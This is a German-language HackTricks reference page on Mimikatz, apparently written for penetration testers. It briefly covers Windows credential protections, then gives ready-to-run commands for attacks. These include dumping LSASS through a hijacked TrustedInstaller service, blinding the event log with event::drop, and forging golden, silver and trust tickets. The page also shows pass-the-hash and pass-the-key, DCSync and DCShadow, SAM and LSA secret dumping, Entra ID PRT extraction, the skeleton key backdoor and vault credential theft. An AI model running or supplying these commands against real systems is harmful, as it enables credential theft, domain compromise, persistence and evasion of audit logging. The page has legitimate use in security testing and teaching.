# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Diese Seite basiert auf einer Seite von [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Weitere Informationen finden Sie im Original!<sup>[[3]](#references)</sup>

## LM und Klartext im Speicher

Ab Windows 8.1 und Windows Server 2012 R2 wurden umfangreiche Maßnahmen implementiert, um vor Credential Theft zu schützen:

- **LM-Hashes und Klartextpasswörter** werden zur Verbesserung der Sicherheit nicht mehr im Speicher abgelegt. Eine bestimmte Registry-Einstellung, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, muss mit einem DWORD-Wert von `0` konfiguriert werden, um die Digest Authentication zu deaktivieren und sicherzustellen, dass keine „Klartext“-Passwörter in LSASS zwischengespeichert werden.

- **LSA Protection** wurde eingeführt, um den Prozess der Local Security Authority (LSA) vor unbefugtem Lesen des Speichers und Code Injection zu schützen. Dies wird erreicht, indem LSASS als geschützter Prozess markiert wird. Die Aktivierung von LSA Protection umfasst:
1. Ändern der Registry unter _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_, indem `RunAsPPL` auf `dword:00000001` gesetzt wird.
2. Implementieren eines Group Policy Object (GPO), das diese Registry-Änderung auf allen verwalteten Geräten erzwingt.

Trotz dieser Schutzmaßnahmen können Tools wie Mimikatz LSA Protection mithilfe bestimmter Treiber umgehen, wobei solche Aktionen wahrscheinlich in Event Logs aufgezeichnet werden.

Auf modernen Workstations ist dies noch wichtiger, da **Credential Guard auf vielen Windows 11 22H2+ und Windows Server 2025 Systemen, die einer Domäne beigetreten und keine DCs sind, standardmäßig aktiviert ist**, während **LSASS-as-PPL bei neuen Windows 11 22H2+-Installationen standardmäßig aktiviert ist**. In der Praxis bedeutet dies, dass `sekurlsa::logonpasswords` häufig weniger Material liefert, als ältere Tradecraft erwarten ließ, und Operatoren zunehmend auf **offline Minidumps**, **Kerberos-Key-Extraktion (`sekurlsa::ekeys`)** oder **CloudAP-/PRT-orientierte Module** ausweichen. Informationen zum Schutz finden Sie unter [Windows credentials protections](credentials-protections.md).

### Entfernen von SeDebugPrivilege entgegenwirken

Administratoren verfügen normalerweise über SeDebugPrivilege, wodurch sie Programme debuggen können. Dieses Privileg kann eingeschränkt werden, um unbefugte Memory Dumps zu verhindern, eine häufig von Angreifern verwendete Technik zum Extrahieren von Credentials aus dem Speicher. Selbst wenn dieses Privileg entfernt wurde, kann das TrustedInstaller-Konto mithilfe einer angepassten Service-Konfiguration weiterhin Memory Dumps erstellen:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Dies ermöglicht das Dumping des `lsass.exe`-Speichers in eine Datei, die anschließend auf einem anderen System analysiert werden kann, um Credentials zu extrahieren:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz-Optionen

Das Manipulieren von Ereignisprotokollen in Mimikatz umfasst zwei primäre Aktionen: das Löschen von Ereignisprotokollen und das Patchen des Event service, um die Protokollierung neuer Ereignisse zu verhindern. Nachfolgend findest du die Befehle zur Durchführung dieser Aktionen:

#### Löschen von Ereignisprotokollen

- **Befehl**: Diese Aktion zielt darauf ab, die Ereignisprotokolle zu löschen, wodurch es schwieriger wird, bösartige Aktivitäten nachzuverfolgen.
- Mimikatz bietet in seiner Standarddokumentation keinen direkten Befehl zum Löschen von Ereignisprotokollen über die Kommandozeile. Die Manipulation von Ereignisprotokollen erfolgt jedoch typischerweise über Systemtools oder Scripts außerhalb von Mimikatz, um bestimmte Protokolle zu löschen (z. B. mit PowerShell oder der Windows-Ereignisanzeige).

#### Experimentelles Feature: Patchen des Event service

- **Befehl**: `event::drop`
- Dieser experimentelle Befehl wurde entwickelt, um das Verhalten des Event Logging Service zu ändern und ihn dadurch effektiv daran zu hindern, neue Ereignisse zu protokollieren.
- Beispiel: `mimikatz "privilege::debug" "event::drop" exit`

- Der Befehl `privilege::debug` stellt sicher, dass Mimikatz mit den erforderlichen Berechtigungen arbeitet, um Systemdienste zu ändern.
- Der Befehl `event::drop` patcht anschließend den Event Logging service.

### Kerberos Ticket Attacks

Verwende die folgenden Befehle als kurze Syntax-Erinnerung. Die dedizierten Seiten zu [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) und [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) enthalten die aktuellen AES/PAC/opsec-Nuancen.

### Golden Ticket Creation

Ein Golden Ticket ermöglicht die Impersonation mit Zugriff auf die gesamte Domain. Wichtige Befehle und Parameter:

- Befehl: `kerberos::golden`
- Parameter:
- `/domain`: Der Name der Domain.
- `/sid`: Der Security Identifier (SID) der Domain.
- `/user`: Der zu impersonierende Benutzername.
- `/krbtgt`: Der NTLM-Hash des KDC service account der Domain.
- `/ptt`: Injiziert das Ticket direkt in den Speicher.
- `/ticket`: Speichert das Ticket zur späteren Verwendung.

Beispiel:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Silver Tickets gewähren Zugriff auf bestimmte Services. Wichtiger Befehl und wichtige Parameter:

- Befehl: Ähnlich wie beim Golden Ticket, zielt jedoch auf bestimmte Services ab.
- Parameter:
- `/service`: Der anvisierte Service (z. B. cifs, http).
- Weitere Parameter ähnlich wie beim Golden Ticket.

Beispiel:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Erstellung von Trust Tickets

Trust Tickets werden verwendet, um mithilfe von Vertrauensbeziehungen auf Ressourcen domänenübergreifend zuzugreifen. Wichtige Befehle und Parameter:

- Befehl: Ähnlich wie beim Golden Ticket, jedoch für Vertrauensbeziehungen.
- Parameter:
- `/target`: Der FQDN der Zieldomäne.
- `/rc4`: Der NTLM-Hash des Trust-Kontos.

Beispiel:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Zusätzliche Kerberos-Befehle

- **Listing Tickets**:

- Befehl: `kerberos::list`
- Listet alle Kerberos-Tickets für die aktuelle Benutzersitzung auf.

- **Pass the Cache**:

- Befehl: `kerberos::ptc`
- Injiziert Kerberos-Tickets aus Cache-Dateien.
- Beispiel: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Befehl: `kerberos::ptt`
- Ermöglicht die Verwendung eines Kerberos-Tickets in einer anderen Sitzung.
- Beispiel: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**:
- Befehl: `kerberos::purge`
- Entfernt alle Kerberos-Tickets aus der Sitzung.
- Nützlich vor der Verwendung von Ticket-Manipulationsbefehlen, um Konflikte zu vermeiden.

### Over-Pass-the-Hash / Pass-the-Key

Wenn `RC4` deaktiviert oder unzuverlässig ist, kann Mimikatz **AES128/AES256-Kerberos-Schlüssel** in die aktuelle Logonsitzung einfügen, anstatt nur einen NT-Hash zu verwenden. Dies passt in modernen Domänen normalerweise besser, als `sekurlsa::pth` ausschließlich als NTLM-Methode zu behandeln.<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` verwendet den aktuellen Prozess erneut, statt eine neue Konsole zu starten. Das ist praktisch, wenn du sofort Dinge wie `lsadump::dcsync` im selben Kontext ausführen möchtest.

### Active-Directory-Manipulation

- **DCShadow**: Eine Maschine vorübergehend als DC agieren lassen, um AD-Objekte zu manipulieren. Siehe [DCShadow](../active-directory-methodology/dcshadow.md).

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Einen DC nachahmen, um Passwortdaten anzufordern. Siehe [DCSync](../active-directory-methodology/dcsync.md).
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Zugriff auf Credentials

- **LSADUMP::LSA**: Credentials aus der LSA extrahieren.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Einen DC mithilfe der Passwortdaten eines Computerkontos imitieren.

- _Im ursprünglichen Kontext wurde kein spezifischer Befehl für NetSync angegeben._

- **LSADUMP::SAM**: Auf die lokale SAM-Datenbank zugreifen.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: In der Registry gespeicherte Secrets entschlüsseln.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Einen neuen NTLM-Hash für einen Benutzer festlegen.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Authentifizierungsinformationen von Trusts abrufen.
- `mimikatz "lsadump::trust" exit`

### Cloud-Credentials / Entra ID

Auf **Entra ID**- oder **hybrid-joined** Hosts kann `sekurlsa::cloudap` zwischengespeichertes Material des **Primary Refresh Token (PRT)** aus LSASS offenlegen. Wenn der zugehörige Proof-of-Possession-Schlüssel softwaregeschützt ist, kann `dpapi::cloudapkd` das Klartext-/abgeleitete Schlüsselmaterial herleiten, das für nachfolgende **Pass-the-PRT**-Workflows benötigt wird.<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
Das wird deutlich schwieriger, wenn der Schlüssel durch TPM geschützt ist, aber bei hybriden Endpoints lohnt sich eine Überprüfung, da die zwischengespeicherten CloudAP-Daten möglicherweise interessanter sind als die klassische `wdigest`-Ausgabe.<sup>[[2]](#references)</sup> Informationen zur cloudseitigen Abuse-Kette finden Sie unter [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).

### Verschiedenes

- **MISC::Skeleton**: Eine Backdoor in LSASS auf einem DC injizieren.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Rechteausweitung

- **PRIVILEGE::Backup**: Backup-Rechte erlangen.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Debug-Rechte erlangen.
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: Credentials angemeldeter Benutzer anzeigen.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Kerberos-Tickets aus dem Speicher extrahieren.
- `mimikatz "sekurlsa::tickets /export" exit`

### SID- und Token-Manipulation

- **SID::add/modify**: SID und SIDHistory ändern.

- Hinzufügen: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Ändern: _Im ursprünglichen Kontext wurde kein spezifischer Befehl zum Ändern angegeben._

- **TOKEN::Elevate**: Tokens impersonifizieren.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Mehrere RDP-Sitzungen erlauben.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: TS-/RDP-Sitzungen auflisten.
- _Im ursprünglichen Kontext wurde kein spezifischer Befehl für TS::Sessions angegeben._

### Vault

- Passwörter aus dem Windows Vault extrahieren.
- `mimikatz "vault::cred /patch" exit`


## Referenzen

- [1] [Die Hacker-Tools – Mimikatz-Module](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB und Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Mimikatz-Befehlsreferenz](https://adsecurity.org/?page_id=1821)

{{#include ../../banners/hacktricks-training.md}}
